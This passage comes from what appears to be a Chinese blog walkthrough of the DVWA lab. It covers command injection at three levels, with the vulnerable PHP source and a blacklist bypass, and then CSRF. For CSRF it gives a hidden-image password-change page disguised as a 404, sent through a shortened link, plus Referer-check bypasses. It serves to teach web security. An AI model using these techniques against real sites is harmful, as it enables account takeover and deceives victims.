punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Windows</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// *nix</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Feedback for the end user</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$cmd</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后台代码并未对用户输入的参数ip的值进行过滤就直接与ping命令进行拼接并执行 ，因此我们可以使用常见的命令拼接字符对命令进行拼接，如使用“&amp;”，“|”，“&amp;&amp;”，“||”等，linux系统下还可以使用“;”，“&#96;&#96;”。</p><ul><li>对于a &amp; b，既执行a的命令也执行b的命令；</li><li>对于a &amp;&amp; b，在a执行成功的情况下执行b，a执行失败就不会执行b，和逻辑与一样；</li><li>对于a | b，“|”为管道符，它将a执行的结果作为b的输入，因此无论a执行结果如何，都会执行b；</li><li>对于a || b，在a执行失败的情况下执行b，a执行成功则不会执行b，和逻辑或一样；</li><li>对于a;b，在Linux系统下会将a和b都执行；<br>以下为攻击代码：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/20.png"><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/21.png"><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/22.png"></li></ul><h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Set blacklist</span>    <span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'&amp;&amp;'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">';'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Remove any of the charactars in the array (blacklist).</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token function">array_keys</span><span class="token punctuation">(</span> <span class="token variable">$substitutions</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$substitutions</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Determine OS and execute the ping command.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Windows</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// *nix</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Feedback for the end user</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$cmd</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加入了字符转义，将&amp;&amp;和；过滤了不过没什么差别，和sqli-lab的转义过滤差不多，绕过方法也一样<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/23.png"></p><h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Set blacklist</span>    <span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'&amp;'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">';'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'| '</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'-'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'$'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'('</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">')'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'`'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'||'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Remove any of the charactars in the array (blacklist).</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token function">array_keys</span><span class="token punctuation">(</span> <span class="token variable">$substitutions</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$substitutions</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Determine OS and execute the ping command.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Windows</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// *nix</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Feedback for the end user</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$cmd</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了更多了，只是“||”和“| |”是有差别的，之间有多个空格可以利用<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/24.png"><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/25.png"><br>这样就不会被过滤</p><h2 id="0x04-Cross-Site-Request-Forgery-CSRF"><a href="#0x04-Cross-Site-Request-Forgery-CSRF" class="headerlink" title="0x04 Cross Site Request Forgery (CSRF)"></a>0x04 Cross Site Request Forgery (CSRF)</h2><hr><p>ps：学了这么久第一次让我感觉非常感兴趣的技术就是这个了，我终于明白以前小学别人是怎么盗我号的了，不得不说真的骚</p><ul><li>原理：CSRF（跨站请求伪造），全称为Cross-site request forgery，简单来说，是攻击者利用受害者尚未失效的身份认证信息，诱骗受害者点击恶意链接或含有攻击代码的页面，在受害者不知情的情况下以受害者的身份像服务器发起请求，从而实现非法攻击（改密）。</li></ul><h3 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h3><p>这一关是一个改密码的界面，输入新密码后可以发现自己的dvwa密码确实被改了，这个可以去Brute Force这个关卡去验证登入<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/26.png"><br>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Get input</span><span class="token comment">//获取两个输入框的密码</span>    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Do the passwords match?</span><span class="token comment">//查看两次输入的是否一致</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// They do!</span><span class="token comment">//如果一致就直接插入数据库</span>        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Update the database</span>        <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '<span class="token interpolation"><span class="token variable">$pass_new</span></span>' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre>'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Feedback for the user</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Issue with passwords matching</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们将改密码后的关卡url进行复制，然后用同一个浏览器新开一个页面粘贴，这里的两个框里的数据可以改，改完后网站密码就是你改后的密码<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/27.png"><br>这里就可以利用了，通常消费者不会去点击陌生的长链接，我们可以将我们的链接改短（这个在网上搜索在线链接缩短就有）去欺骗消费者，我们可以将界面改为<strong>404</strong>这样就可以做到让消费者认为页面出错而已，实际上恶意代码已经执行<br>生成链接：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/28.png"><br>在phpstudy&#x2F;www文件夹下新建1.html文件并输入以下代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/dvwa-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>404<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>file not found.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样用生成的链接去访问文件，打开这个文件就会执行这个代码（链接访问后会自己变回原来的长链接）<br>效果如图：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/29.png"><br>这时你再去试就会发现你的密码被改了，是不是很神奇</p><h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Checks to see where the request came from</span><span class="token comment">//stripos(str1, str2)检查str2在str1中出现的位置（不区分大小写)，如果有返//回True，反之False</span><span class="token comment">//判断Host字段是否出现在referer字段中</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Get input</span>        <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// Do the passwords match?</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// They do!</span>            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Update the database</span>            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '<span class="token interpolation"><span class="token variable">$pass_new</span></span>' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre>'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Feedback for the user</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// Issue with passwords matching</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Didn't come from a trusted source</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>That request didn't look correct.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是127.0.0.1），希望通过这种机制抵御CSRF攻击。<br>我们可以看看用Low的方法抓包后的区别<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/30.png"><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/31.png"></p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>我们把地址栏抓到的数据包发送给重发器，把在页面数据包中的referer复制过来，结果如下，成功：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/32.png"></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>因为它对比的是打开的链接HOST参数（127.0.0.1）在原来网站的reference有没有存在<strong>（用这个函数stripos(str1, str2)来比较）</strong>那我们的思路可以更骚直接把文件名命名为127.0.0.1.html，这里为了更好理解，这里附上图可以看到reference是127.0.0.1&#x2F;127.0.0.1.html，然后访问的head参数也是127.0.0.1满足条件绕过。其实这里用Low的方法也行<br>因为127.0.0.1&#x2F;1.htm也带有127.0.0.1也可以绕过如果把靶场用本机ip来替换127.0.0.1，这题会更好。<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/33.png"></p><h3 id="High-3"><a href="#High-3" class="headerlink" 